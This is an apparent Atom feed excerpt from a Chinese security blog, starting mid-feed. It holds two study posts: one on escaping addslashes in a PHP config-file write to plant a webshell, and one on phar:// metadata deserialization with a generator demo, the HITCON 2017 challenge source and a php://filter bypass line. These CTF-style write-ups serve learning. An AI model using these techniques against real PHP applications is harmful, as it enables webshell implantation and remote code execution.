    <content type="html"><![CDATA[<p>以下内容是对 wonderkun 师傅这篇 <a href="https://blog.wonderkun.cc/2017/02/28/php%E5%86%99%E5%85%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">文章</a> 的学习。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'option'</span>])) <span class="keyword">die</span>();</span><br><span class="line">$str = addslashes($_GET[<span class="string">'option'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./config.php'</span>); </span><br><span class="line">$file = preg_replace(<span class="string">'|\$option=\'.*\';|'</span>, <span class="string">"\$option='$str';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./config.php'</span>, $file);</span><br></pre></td></tr></table></figure><p>写入 webshell 需要构造 <code>&#39;</code> 闭合，而 <code>&#39;</code> 直接传入将会被 <code>addslashes</code> 转义，看似安全实则不然。</p><p>未对内容进行处理直接写入是一种极其危险的做法，通过一些小手法就可以为所欲为。</p><h2 id="换行符"><a href="#换行符" class="headerlink" title="换行符"></a>换行符</h2><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g4vohoey00j20i202gweg.jpg" alt></p><p>成功写到下一行，但<code>&#39;</code> 还是被转义了，问题不大，再替换下就行。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g4voickhwej20hy02gdfr.jpg" alt></p><h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h2><p>正常转义</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dofwyyudj20hb021q2v.jpg" alt></p><p>成功逃逸</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dofc393wj20hd022q2u.jpg" alt></p><h2 id="后向引用"><a href="#后向引用" class="headerlink" title="后向引用"></a>后向引用</h2><p>这思路是真的牛逼，下面的 <code>replacement</code> 就是说第二个参数。</p><blockquote><p><code>replacement</code> 中可以包含后向引用 <em>\n</em> 或 <em>$n</em>，语法上首选后者。 每个 这样的引用将被匹配到的第 n 个捕获子组捕获到的文本替换。 n 可以是 0-99，<em>\0</em> 和 <em>$0</em> 代表完整的模式匹配文本。 捕获子组的序号计数方式为：代表捕获子组的左括号从左到右， 从 1 开始数。</p></blockquote><p>构造一个</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g4vqxix006j20gc025a9z.jpg" alt></p><p>再来一下，使用 <code>$0</code> 或者 <code>\0</code>。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g4vqyanufnj20gb02b0sn.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;以下内容是对 wonderkun 师傅这篇 &lt;a href=&quot;https://blog.wonderkun.cc/2017/02/28/php%E5%86%99%E5%85%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E7
      
    
    </summary>
    
    
      <category term="php" scheme="https://wywwzjj.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>phar 与反序列化学习</title>
    <link href="https://wywwzjj.top/2019/05/18/phar-%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <id>https://wywwzjj.top/2019/05/18/phar-与反序列化学习/</id>
    <published>2019-05-18T09:45:39.000Z</published>
    <updated>2020-02-01T03:37:04.035Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="与普通反序列化利用有什么区别？"><a href="#与普通反序列化利用有什么区别？" class="headerlink" title="与普通反序列化利用有什么区别？"></a>与普通反序列化利用有什么区别？</h3><p>在 PHP 下利用反序列化漏洞的时候，通常走这样的一条路线：</p><p><strong>反序列化点 =&gt; 可利用函数 =&gt; 构造反序列化 POP 链</strong></p><p>但在 2018 年的 Black Hat 上，安全研究员 Sam Thomas 指出了一条新思路：</p><p>在<strong>文件系统函数</strong> （ file_get_contents 、 unlink 等）参数可控的情况下，配合 <strong>phar:// 伪协议</strong> ，可以不依赖反序列化函数 <code>unserialize()</code> 直接进行反序列化的操作。</p><h3 id="phar-是什么？"><a href="#phar-是什么？" class="headerlink" title="phar 是什么？"></a>phar 是什么？</h3><p><a href="https://www.php.net/manual/en/phar.using.intro.php" target="_blank" rel="noopener">官方文档</a> 给出了详细的解释。概括来说，有如下<strong>特点</strong>：</p><ul><li><p>Phar 存档在概念上类似于 Java JAR 存档，但是根据 PHP 应用程序的需求和灵活性进行了定制。</p></li><li><p>Phar 可以把多个文件归档到同一个文件中，不经过解压就能被 PHP 访问并执行。</p></li><li><p>Meta-data can be any PHP variable that can be serialized.</p></li></ul><p>最后一点尤其重要，有序列化就有反序列。</p><blockquote><p>This meta-data is unserialized when a Phar archive is first accessed by any(!) file operation. </p><p>This opens the door to unserialization attacks whenever a file operation occurs on a path whose<br>beginning is controlled by an attacker.</p></blockquote><p>再看一下 phar 的<strong>文件结构</strong>。</p><blockquote><p>The phar file format is literally laid out as stub / manifest / contents / signature, and stores the crucial information of what is included in the phar archive in its <em>manifest</em>.</p></blockquote><p>也就是说分为四个部分：</p><ul><li><p>stub</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Phar::mapPhar();</span><br><span class="line"><span class="keyword">include</span> <span class="string">'phar://myphar.phar/index.php'</span>;</span><br><span class="line"><span class="comment"><span class="keyword">__HALT_COMPILER</span>();</span></span><br></pre></td></tr></table></figure><p>  可以当做一个标志来理解，正如上面写的这样，必须以 <code>_HALT_COMPILER();</code> 结尾。所以在设置 <code>stub</code> 时，也要有 <code>__HALT_COMPILER();</code> ，这里的设置就相当灵活了，你可以随便插数据 。比如：</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx;<span class="comment"><span class="keyword">__HALT_COMPILER</span>();</span></span><br><span class="line"><span class="comment">// 需要提醒的是 &lt;?php ?&gt; 并不是必须的，以 ; 隔开即可，可避开检测 &lt;? 的情况</span></span><br></pre></td></tr></table></figure></li><li><p>manifest</p><p>  phar 文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的 meta-data，这是上述攻击手法最核心的地方。</p><p>  <img src="http://ww1.sinaimg.cn/large/de75fd55gy1g385zk9pc4j20np0a775m.jpg" alt></p></li><li><p>contents：被压缩文件的内容。</p></li><li><p>signature：签名，放在文件末尾。</p></li></ul><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>用个小 Demo 来测试一下反序列化（注意要将 php.ini 中的 phar.readonly 选项设置为 0，否则无法生成）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// phar_gen.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $pp = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"destruct was called!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">ini_set(<span class="string">'phar.readonly'</span>,<span class="string">"Off"</span>);</span><br><span class="line">    @unlink(<span class="string">"test.phar"</span>);</span><br><span class="line">    $p = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>);  <span class="comment">// 后缀名必须为phar，生成后可随意修改</span></span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(<span class="string">"2333;__HALT_COMPILER();"</span>);  <span class="comment">// 设置stub</span></span><br><span class="line"><span class="comment">// $p-&gt;compressFiles(Phar::GZ);  // 可设置压缩包，使用时照旧</span></span><br><span class="line">    $p-&gt;setMetadata(<span class="keyword">new</span> Test());  <span class="comment">// 将自定义的 meta-data 存入 manifest</span></span><br><span class="line">    $p-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);  <span class="comment">// 添加要压缩的文件</span></span><br><span class="line">    <span class="comment">// 签名自动计算</span></span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到 meta-data 在 phar 中的存在形式</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g386hud6grj20hj070jsn.jpg" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dese_phar.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $pp = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"destruct was called!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="string">'phar://test.phar/1'</span>;  <span class="comment">// 这里访问的文件存在与否都不重要</span></span><br><span class="line">    file_get_contents($filename);</span><br></pre></td></tr></table></figure><p>可以看到析构函数被成功调用</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g386lyrg9aj20ki036mxg.jpg" alt></p><p>seaii 师傅给出了函数列表</p><p><img src="https://images.seebug.org/content/images/2018/08/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s" alt></p><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>这里不得不提 orange 在 hitcon 2017 出的 <code>baby^h-master-php-2017</code>，本题可以通过 <a href="http://117.50.3.97:8005/" target="_blank" rel="noopener">i 春秋平台复现</a>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$FLAG = create_function(<span class="string">""</span>, <span class="string">'die(`/read_flag`);'</span>);</span><br><span class="line">$SECRET = `/read_secret`;</span><br><span class="line">$SANDBOX = <span class="string">"/var/www/data/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">@mkdir($SANDBOX);</span><br><span class="line">@chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"session-data"</span>])) &#123;</span><br><span class="line">$data = serialize(<span class="keyword">new</span> User($SANDBOX));</span><br><span class="line">$hmac = hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET);</span><br><span class="line">setcookie(<span class="string">"session-data"</span>, sprintf(<span class="string">"%s-----%s"</span>, $data, $hmac));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $avatar;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;avatar = $path;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 猜测执行 FLAG() 出 flag</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function my_function_$random() &#123;"</span></span><br><span class="line">. <span class="string">"  global \$FLAG; \$FLAG();"</span></span><br><span class="line">. <span class="string">"&#125;"</span>);</span><br><span class="line"><span class="comment">// 难道要爆破？</span></span><br><span class="line">$_GET[<span class="string">"lucky"</span>]();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $SECRET;</span><br><span class="line">$data = $_COOKIE[<span class="string">"session-data"</span>];</span><br><span class="line"><span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Bye"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!hash_equals(hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET), $hmac)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Bye Bye"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化点，但无法更改 session 的值</span></span><br><span class="line">$data = unserialize($data);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($data-&gt;avatar)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $data-&gt;avatar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line"><span class="comment">// vps 准备好 phar 文件</span></span><br><span class="line">$data = file_get_contents($_GET[<span class="string">"url"</span>] . <span class="string">"/avatar.gif"</span>);</span><br><span class="line"><span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">"GIF89a"</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Fuck off"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_put_contents($path . <span class="string">"/avatar.gif"</span>, $data);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Upload OK"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 这两个函数都将造成反序列化</span></span><br><span class="line"><span class="keyword">if</span> (!file_exists($path . <span class="string">"/avatar.gif"</span>)) &#123;</span><br><span class="line">$path = <span class="string">"/var/www/html"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-Type: image/gif"</span>);</span><br><span class="line"><span class="keyword">die</span>(file_get_contents($path . <span class="string">"/avatar.gif"</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mode = $_GET[<span class="string">"m"</span>];</span><br><span class="line"><span class="keyword">if</span> ($mode == <span class="string">"upload"</span>) &#123;</span><br><span class="line">upload(check_session());</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"show"</span>) &#123;</span><br><span class="line">show(check_session());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外还有：</p><ul><li><p>护网杯 easy laravel</p></li><li><p>code-breaking lumenserial</p></li></ul><h2 id="相关绕过"><a href="#相关绕过" class="headerlink" title="相关绕过"></a>相关绕过</h2><p>TODO</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=phar://phar.phar</span></span><br></pre></td></tr></table></figure><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>来看一下源码  <a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618" target="_blank" rel="noopener">php-src/ext/phar/phar.c:618</a>，调用了 <code>php_var_unserialize</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!php_var_unserialize(metadata, &amp;p, p + zip_metadata_len, &amp;var_hash)) &#123;</span><br></pre></td></tr></table></figure><p>太忙了，有时间深入分析一下。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38</a></p><p><a href="https://blog.szfszf.top/tech/phar%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://blog.szfszf.top/tech/phar%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/" target="_blank" rel="noopener">http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;h3 id=&quot;与普通反序列化利用有什么区别？&quot;&gt;&lt;a href=&quot;#与普通反序列化利用有什么区别？&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
</feed>
